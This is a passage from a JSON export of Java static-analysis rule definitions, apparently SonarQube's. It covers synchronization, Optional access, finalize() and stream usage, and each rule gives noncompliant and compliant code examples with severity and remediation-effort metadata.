            "mdDesc": "<p>Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown.\nOnly a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized). </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Vegetable {  // neither implements Serializable nor extends a class that does\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);  // Noncompliant. Nothing will be written\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Vegetable implements Serializable {  // can now be serialized\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "serialization"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2445",
            "repo": "java",
            "name": "Blocks should be synchronized on \"private final\" fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>\nfield makes it possible for the field's value to change while a thread is in a block synchronized on the old value. That would allow a second thread,\nsynchronized on the new value, to enter the block at the same time.</p>\n<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object\ninstances in to the method as parameters, completely undermining the synchronization.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate String color = \"red\";\n\nprivate void doSomething(){\n  synchronized(color) {  // Noncompliant; lock is actually on object instance \"red\" referred to by the color variable\n    //...\n    color = \"green\"; // other threads now allowed into this block\n    // ...\n  }\n  synchronized(new Object()) { // Noncompliant this is a no-op.\n     // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate String color = \"red\";\nprivate final Object lockObj = new Object();\n\nprivate void doSomething(){\n  synchronized(lockObj) {\n    //...\n    color = \"green\";\n    // ...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/412.html\">MITRE, CWE-412</a> - Unrestricted Externally Accessible Lock </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/413\">MITRE, CWE-413</a> - Improper Resource Locking </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/djdGBQ\">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that may\n  interact with untrusted code </li>\n</ul>",
            "mdDesc": "<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>\nfield makes it possible for the field's value to change while a thread is in a block synchronized on the old value. That would allow a second thread,\nsynchronized on the new value, to enter the block at the same time.</p>\n<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object\ninstances in to the method as parameters, completely undermining the synchronization.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate String color = \"red\";\n\nprivate void doSomething(){\n  synchronized(color) {  // Noncompliant; lock is actually on object instance \"red\" referred to by the color variable\n    //...\n    color = \"green\"; // other threads now allowed into this block\n    // ...\n  }\n  synchronized(new Object()) { // Noncompliant this is a no-op.\n     // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate String color = \"red\";\nprivate final Object lockObj = new Object();\n\nprivate void doSomething(){\n  synchronized(lockObj) {\n    //...\n    color = \"green\";\n    // ...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/412.html\">MITRE, CWE-412</a> - Unrestricted Externally Accessible Lock </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/413\">MITRE, CWE-413</a> - Improper Resource Locking </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/djdGBQ\">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that may\n  interact with untrusted code </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3655",
            "repo": "java",
            "name": "Optional value should only be accessed after calling isPresent()",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the\n<code>get()</code> method, but it will throw a </p>\n<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> or <code>!\nisEmpty()</code> method should always be done before any call to <code>get()</code>.</p>\n<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used\nto specify what to do with an empty <code>Optional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.get(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nif (value.isPresent()) {\n  String stringValue = value.get();\n}\n</pre>\n<p>or</p>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.orElse(\"default\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE, CWE-476</a> - NULL Pointer Dereference </li>\n</ul>",
            "mdDesc": "<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the\n<code>get()</code> method, but it will throw a </p>\n<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> or <code>!\nisEmpty()</code> method should always be done before any call to <code>get()</code>.</p>\n<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used\nto specify what to do with an empty <code>Optional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.get(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nif (value.isPresent()) {\n  String stringValue = value.get();\n}\n</pre>\n<p>or</p>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.orElse(\"default\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE, CWE-476</a> - NULL Pointer Dereference </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2203",
            "repo": "java",
            "name": "\"collect\" should be used with \"Streams\" instead of \"list::add\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the\nbetter choice because it's automatically thread-safe and parallellizable. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; bookNames = new ArrayList&lt;&gt;();\nbooks.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .forEach(bookNames::add);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .collect(Collectors.toList());\n</pre>",
            "mdDesc": "<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the\nbetter choice because it's automatically thread-safe and parallellizable. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; bookNames = new ArrayList&lt;&gt;();\nbooks.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .forEach(bookNames::add);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .collect(Collectors.toList());\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3776",
            "repo": "java",
            "name": "Cognitive Complexity of methods should not be too high",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be\ndifficult to maintain.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://redirect.sonarsource.com/doc/cognitive-complexity.html\">Cognitive Complexity</a> </li>\n</ul>",
            "mdDesc": "<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be\ndifficult to maintain.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://redirect.sonarsource.com/doc/cognitive-complexity.html\">Cognitive Complexity</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "Threshold",
                    "htmlDesc": "The maximum authorized complexity.",
                    "defaultValue": "15",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "1min",
            "defaultDebtRemFnOffset": "5min",
            "effortToFixDescription": "per complexity point over the threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "1min",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "1min",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "1min",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "gapDescription": "per complexity point over the threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5831",
            "repo": "java",
            "name": "AssertJ configuration should be applied",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>org.assertj.core.configuration.Configuration</code> will be effective only once you call <code>Configuration.apply()</code> or\n<code>Configuration.applyAndDisplay()</code>.</p>\n<p>This rule raises an issue when configurations are set without the appropriate call to apply them.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConfiguration configuration = new Configuration(); // Noncompliant, this configuration will not be applied.\nconfiguration.setComparingPrivateFields(true);{code}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nConfiguration configuration = new Configuration();\nconfiguration.setComparingPrivateFields(true);\nconfiguration.applyAndDisplay();\n// Alternatively: configuration.apply();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#assertj-configuration\">AssertJ configuration documentation</a> </li>\n</ul>",
            "mdDesc": "<p>A <code>org.assertj.core.configuration.Configuration</code> will be effective only once you call <code>Configuration.apply()</code> or\n<code>Configuration.applyAndDisplay()</code>.</p>\n<p>This rule raises an issue when configurations are set without the appropriate call to apply them.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConfiguration configuration = new Configuration(); // Noncompliant, this configuration will not be applied.\nconfiguration.setComparingPrivateFields(true);{code}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nConfiguration configuration = new Configuration();\nconfiguration.setComparingPrivateFields(true);\nconfiguration.applyAndDisplay();\n// Alternatively: configuration.apply();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#assertj-configuration\">AssertJ configuration documentation</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2325",
            "repo": "java",
            "name": "\"private\" and \"final\" methods that don't access instance data should be \"static\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Non-overridable methods (<code>private</code> or <code>final</code>) that don't access instance data can be <code>static</code> to prevent any\nmisunderstanding about the contract of the method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private String getMagicWord() { // Noncompliant\n    return magicWord;\n  }\n\n  private void setMagicWord(String value) { // Noncompliant\n    magicWord = value;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private static String getMagicWord() {\n    return magicWord;\n  }\n\n  private static void setMagicWord(String value) {\n    magicWord = value;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>\n<ul>\n  <li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>\n  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>\n  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>\n</ul>",
            "mdDesc": "<p>Non-overridable methods (<code>private</code> or <code>final</code>) that don't access instance data can be <code>static</code> to prevent any\nmisunderstanding about the contract of the method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private String getMagicWord() { // Noncompliant\n    return magicWord;\n  }\n\n  private void setMagicWord(String value) { // Noncompliant\n    magicWord = value;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private static String getMagicWord() {\n    return magicWord;\n  }\n\n  private static void setMagicWord(String value) {\n    magicWord = value;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>\n<ul>\n  <li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>\n  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>\n  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3414",
            "repo": "java",
            "name": "Tests should be kept in a dedicated source directory",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is a good practice to isolate test classes in a separate package so that what is shipped to production is neither polluted by nor bloated with\nthem. Further, including unit tests in code assemblies could affect build processes.</p>\n<p>This rule raises an issue when test classes are found in projects containing non-test-related code.</p>",
            "mdDesc": "<p>It is a good practice to isolate test classes in a separate package so that what is shipped to production is neither polluted by nor bloated with\nthem. Further, including unit tests in code assemblies could affect build processes.</p>\n<p>This rule raises an issue when test classes are found in projects containing non-test-related code.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1114",
            "repo": "java",
            "name": "\"super.finalize()\" should be called at the end of \"Object.finalize()\" implementations",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>\n<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also\ndispose some system resources.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprotected void finalize() {   // Noncompliant; no call to super.finalize();\n  releaseSomeResources();\n}\n\nprotected void finalize() {\n  super.finalize();  // Noncompliant; this call should come last\n  releaseSomeResources();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprotected void finalize() {\n  releaseSomeResources();\n  super.finalize();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/568.html\">MITRE, CWE-568</a> - finalize() Method Without super.finalize() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "mdDesc": "<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>\n<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also\ndispose some system resources.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprotected void finalize() {   // Noncompliant; no call to super.finalize();\n  releaseSomeResources();\n}\n\nprotected void finalize() {\n  super.finalize();  // Noncompliant; this call should come last\n  releaseSomeResources();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprotected void finalize() {\n  releaseSomeResources();\n  super.finalize();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/568.html\">MITRE, CWE-568</a> - finalize() Method Without super.finalize() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2446",
            "repo": "java",
            "name": "\"notifyAll\" should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code>\nrouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notify();  // Noncompliant\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notifyAll();\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MTdGBQ\">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread </li>\n</ul>",
            "mdDesc": "<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code>\nrouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notify();  // Noncompliant\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyThread extends Thread{\n\n  @Override\n  public void run(){\n    synchronized(this){\n      // ...\n      notifyAll();\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MTdGBQ\">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1598",
            "repo": "java",
            "name": "Package declaration should match source file directory",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By convention, a Java class' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java\nfile located at <code>\"src/org/bar/Foo.java\"</code> should have a package of <code>\"org.bar\"</code>. </p>\n<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the \"Foo.java\" class part of the\n\"com.apple\" package, which could degrade the maintainability of both the class and its application.</p>\n<p>Similarly, source placed in a folder with dots in its name instead of having the equivalent folder structure will compile but cause problems at run\ntime. For instance, code with a package declaration of <code>org.foo.bar</code> that is placed in <code>org/foo.bar</code> will compile, but the\nclassloader will always search for the class into the folder based on package structure, and will consequently expect sources to be in\n<code>org/foo/bar</code> folder. <code>foo.bar</code> is therefore not a proper folder name for sources.</p>",
            "mdDesc": "<p>By convention, a Java class' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java\nfile located at <code>\"src/org/bar/Foo.java\"</code> should have a package of <code>\"org.bar\"</code>. </p>\n<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the \"Foo.java\" class part of the\n\"com.apple\" package, which could degrade the maintainability of both the class and its application.</p>\n<p>Similarly, source placed in a folder with dots in its name instead of having the equivalent folder structure will compile but cause problems at run\ntime. For instance, code with a package declaration of <code>org.foo.bar</code> that is placed in <code>org/foo.bar</code> will compile, but the\nclassloader will always search for the class into the folder based on package structure, and will consequently expect sources to be in\n<code>org/foo/bar</code> folder. <code>foo.bar</code> is therefore not a proper folder name for sources.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2204",
            "repo": "java",
            "name": "\".equals()\" should not be used to test the values of \"Atomic\" classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they're distinct from <code>Integer</code> and\n<code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free,\nthread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be \"equal\" to itself. Instead, you should\n<code>.get()</code> the value and make comparisons on it.</p>\n<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and\n<code>AtomicBoolean</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.equals(aInt2)) { ... }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.get() == aInt2.get()) { ... }\n</pre>",
            "mdDesc": "<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they're distinct from <code>Integer</code> and\n<code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free,\nthread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be \"equal\" to itself. Instead, you should\n<code>.get()</code> the value and make comparisons on it.</p>\n<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and\n<code>AtomicBoolean</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.equals(aInt2)) { ... }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nAtomicInteger aInt1 = new AtomicInteger(0);\nAtomicInteger aInt2 = new AtomicInteger(0);\n\nif (aInt1.get() == aInt2.get()) { ... }\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1113",
            "repo": "java",
            "name": "The Object.finalize() method should not be overridden",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>Object.finalize()</code> method is called on an object by the garbage collector when it determines that there are no more references to\nthe object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be\nfew microseconds to few minutes later. So when system resources need to be disposed by an object, it's better to not rely on this asynchronous\nmechanism to dispose them.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  ...\n  protected void finalize() {\n    releaseSomeResources();    // Noncompliant\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
